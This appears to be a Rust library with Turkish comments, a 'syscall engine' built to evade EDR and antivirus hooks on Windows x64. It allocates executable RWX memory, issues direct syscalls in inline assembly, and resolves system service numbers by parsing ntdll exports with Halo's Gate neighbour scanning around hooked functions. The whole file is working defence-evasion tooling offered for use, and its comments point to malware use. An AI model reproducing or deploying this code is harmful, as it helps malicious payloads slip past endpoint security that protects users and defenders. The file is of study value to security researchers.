// Drakben Syscall Engine (Hell's Gate / Halo's Gate)
// Target: Windows x64
// Author: @ahmetdrak
//
// Bu kütüphane, Windows API hook'larını (EDR/AV) atlatmak için
// "Direct System Calls" tekniğini uygular.

use std::ffi::c_void;

#[cfg(windows)]
use windows_sys::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAlloc,
};

// -----------------------------------------------------------------------------
// EXPORTED FUNCTIONS (Python FFI için)
// -----------------------------------------------------------------------------

/// Ping-Pong Sağlık Kontrolü
#[no_mangle]
pub extern "C" fn check_health() -> i32 {
    1337
}

/// Windows'ta Güvenli Bellek Alanı (RWX) Tahsis Et
/// Kali Linux üzerinde bu fonksiyon 0 (Hata) döner.
#[no_mangle]
pub extern "C" fn allocate_rwx(size: usize) -> *mut c_void {
    #[cfg(windows)]
    unsafe {
        VirtualAlloc(
            std::ptr::null_mut(),
            size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    }

    #[cfg(not(windows))]
    {
        std::ptr::null_mut()
    }
}

/// Basit ve Doğrudan "Hell's Gate" Syscall Çağırıcısı
/// Verilen SSN (System Service Number) ile kernel'e atlar.
///
/// Args:
///     ssn: Çağrılacak fonksiyonun Kernel ID'si (örn: NtAllocateVirtualMemory için 0x18)
///     r10_arg: İlk argüman (RCX -> R10'a kopyalanır)
///     rdx_arg: İkinci argüman
///     r8_arg: Üçüncü, r9_arg: Dördüncü...
///
/// Not: Gerçek bir malware'de argüman sayısı değişkendir. Burada demo amaçlı sabit.
#[cfg(all(windows, target_arch = "x86_64"))]
#[no_mangle]
pub extern "C" fn direct_syscall(ssn: u32) -> i32 {
    let status: i32;
    unsafe {
        std::arch::asm!(
            "mov r10, rcx",
            "mov eax, {0:e}", // SSN numarasını EAX'e koy
            "syscall",       // Çekirdeğe zıpla! (EDR bunu göremez)
            in(reg) ssn,
            lateout("rax") status, // Dönüş değerini al
            // Register'ların bozulmaması için clobber listesi (opsiyonel ama güvenli)
            options(nostack)
        );
    }
    status
}

#[cfg(not(all(windows, target_arch = "x86_64")))]
#[no_mangle]
pub extern "C" fn direct_syscall(_ssn: u32) -> i32 {
    -1 // Desteklenmeyen platform
}

// -----------------------------------------------------------------------------
// INTERNAL HELPERS: Halo's Gate SSN Resolver
// -----------------------------------------------------------------------------

#[cfg(windows)]
unsafe fn get_ntdll_base() -> *mut u8 {
    use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;
    // Güvenilirlik için GetModuleHandle kullanıyoruz.
    // Daha stealth olması için PEB walking yapılabilir ama GetModuleHandle NTDLL için genelde güvenlidir.
    GetModuleHandleA(b"ntdll.dll\0".as_ptr()) as *mut u8
}

#[cfg(windows)]
unsafe fn get_export_ssn(module_base: *mut u8, func_hash: u32) -> Option<u32> {
    use std::slice;

    // DOS Header okuma
    let dos_header = &*(module_base as *const ImageDosHeader);
    if dos_header.e_magic != 0x5A4D { // MZ
        return None;
    }

    // NT Headers
    let nt_headers = &*(module_base.offset(dos_header.e_lfanew as isize) as *const ImageNtHeaders64);
    
    // Export Directory
    let export_dir_rva = nt_headers.optional_header.data_directory[0].virtual_address;
    if export_dir_rva == 0 {
        return None;
    }

    let export_dir = &*(module_base.offset(export_dir_rva as isize) as *const ImageExportDirectory);
    
    let names = slice::from_raw_parts(
        module_base.offset(export_dir.address_of_names as isize) as *const u32,
        export_dir.number_of_names as usize,
    );
    
    let functions = slice::from_raw_parts(
        module_base.offset(export_dir.address_of_functions as isize) as *const u32,
        export_dir.number_of_functions as usize,
    );
    
    let ordinals = slice::from_raw_parts(
        module_base.offset(export_dir.address_of_name_ordinals as isize) as *const u16,
        export_dir.number_of_names as usize,
    );

    for i in 0..export_dir.number_of_names as usize {
        let name_ptr = module_base.offset(names[i] as isize) as *const i8;
        let func_name = std::ffi::CStr::from_ptr(name_ptr).to_str().unwrap_or("");
        
        // Basit djb2 hash kontrolü (Burada string karşılaştırma yapıyoruz kolaylık için)
        // Gerçek implementasyonda hash kullanmak daha stealth olur.
        if djb2_hash(func_name.as_bytes()) == func_hash {
             let ordinal = ordinals[i] as usize;
             let func_rva = functions[ordinal];
             let func_ptr = module_base.offset(func_rva as isize);
             
             // Halo's Gate: Fonksiyonun ilk byte'larını oku ve SSN'i bul
             // Deseni: 4C 8B D1 B8 <SSN> 00 00
             let bytes = slice::from_raw_parts(func_ptr as *const u8, 32);
             
             // 1. Durum: Hook yok, temiz SSN (mov r10, rcx; mov eax, ssn)
             if bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 && bytes[3] == 0xB8 {
                 let ssn = (bytes[5] as u32) << 8 | (bytes[4] as u32);
                 return Some(ssn);
             }
             
             // 2. Durum: Hook tespit edildi (Genelde 0xE9 - JMP ile başlar)
             // Halo's Gate: Komşu fonksiyonlara bak
             if bytes[0] == 0xE9 {
                 // Yukarı ve aşağı tarama (Max 32 komşu)
                 for offset in 1..32 {
                     // Aşağı Komşular (SSN + offset)
                     if i + offset < export_dir.number_of_names as usize {
                        let ord_down = ordinals[i + offset] as usize;
                        let rva_down = functions[ord_down];
                        let ptr_down = module_base.offset(rva_down as isize) as *const u8;
                        let bytes_down = slice::from_raw_parts(ptr_down, 32);
                        
                        // Komşu temiz mi?
                        if bytes_down[0] == 0x4C && bytes_down[1] == 0x8B && bytes_down[2] == 0xD1 && bytes_down[3] == 0xB8 {
                            let ssn_neighbor = (bytes_down[5] as u32) << 8 | (bytes_down[4] as u32);
                            // Hedef SSN = Komşu SSN - offset
                            if let Some(ssn) = ssn_neighbor.checked_sub(offset as u32) {
                                return Some(ssn);
                            }
                        }
                     }
                     
                     // Yukarı Komşular (SSN - offset)
                     if i >= offset {
                        let ord_up = ordinals[i - offset] as usize;
                        let rva_up = functions[ord_up];
                        let ptr_up = module_base.offset(rva_up as isize) as *const u8;
                        let bytes_up = slice::from_raw_parts(ptr_up, 32);

                        // Komşu temiz mi?
                         if bytes_up[0] == 0x4C && bytes_up[1] == 0x8B && bytes_up[2] == 0xD1 && bytes_up[3] == 0xB8 {
                            let ssn_neighbor = (bytes_up[5] as u32) << 8 | (bytes_up[4] as u32);
                            // Hedef SSN = Komşu SSN + offset
                            if let Some(ssn) = ssn_neighbor.checked_add(offset as u32) {
                                return Some(ssn);
                            }
                        }
                     }
                 }
             }
        }
    }
    
    None
}

// Helper Structures for PE Parsing (Simplified)
#[repr(C)]
struct ImageDosHeader {
    e_magic: u16,
    e_cblp: u16,
    e_cp: u16,
    e_crlc: u16,
    e_cparhdr: u16,
    e_minalloc: u16,
    e_maxalloc: u16,
    e_ss: u16,
    e_sp: u16,
    e_csum: u16,
    e_ip: u16,
    e_cs: u16,
    e_lfarlc: u16,
    e_ovno: u16,
    e_res: [u16; 4],
    e_oemid: u16,
    e_oeminfo: u16,
    e_res2: [u16; 10],
    e_lfanew: i32,
}

#[repr(C)]
struct ImageNtHeaders64 {
    signature: u32,
    file_header: ImageFileHeader,
    optional_header: ImageOptionalHeader64,
}

#[repr(C)]
struct ImageFileHeader {
    machine: u16,
    number_of_sections: u16,
    time_date_stamp: u32,
    pointer_to_symbol_table: u32,
    number_of_symbols: u32,
    size_of_optional_header: u16,
    characteristics: u16,
}

#[repr(C)]
struct ImageOptionalHeader64 {
    magic: u16,
    major_linker_version: u8,
    minor_linker_version: u8,
    size_of_code: u32,
    size_of_initialized_data: u32,
    size_of_uninitialized_data: u32,
    address_of_entry_point: u32,
    base_of_code: u32,
    image_base: u64,
    section_alignment: u32,
    file_alignment: u32,
    major_operating_system_version: u16,
    minor_operating_system_version: u16,
    major_image_version: u16,
    minor_image_version: u16,
    major_subsystem_version: u16,
    minor_subsystem_version: u16,
    win32_version_value: u32,
    size_of_image: u32,
    size_of_headers: u32,
    check_sum: u32,
    subsystem: u16,
    dll_characteristics: u16,
    size_of_stack_reserve: u64,
    size_of_stack_commit: u64,
    size_of_heap_reserve: u64,
    size_of_heap_commit: u64,
    loader_flags: u32,
    number_of_rva_and_sizes: u32,
    data_directory: [ImageDataDirectory; 16],
}

#[repr(C)]
struct ImageDataDirectory {
    virtual_address: u32,
    size: u32,
}

#[repr(C)]
struct ImageExportDirectory {
    characteristics: u32,
    time_date_stamp: u32,
    major_version: u16,
    minor_version: u16,
    name: u32,
    base: u32,
    number_of_functions: u32,
    number_of_names: u32,
    address_of_functions: u32, // RVA from base of image
    address_of_names: u32,     // RVA from base of image
    address_of_name_ordinals: u32, // RVA from base of image
}

fn djb2_hash(bytes: &[u8]) -> u32 {
    let mut hash: u32 = 5381;
    for b in bytes {
        hash = ((hash << 5).wrapping_add(hash)) + (*b as u32);
    }
    hash
}

/// Helper: Resolve SSN by Function Name Hash
#[no_mangle]
pub extern "C" fn resolve_ssn(func_hash: u32) -> i32 {
    #[cfg(windows)]
    unsafe {
        let base = get_ntdll_base();
        if base.is_null() {
            return -1;
        }
        if let Some(ssn) = get_export_ssn(base, func_hash) {
            return ssn as i32;
        }
    }
    -1
}
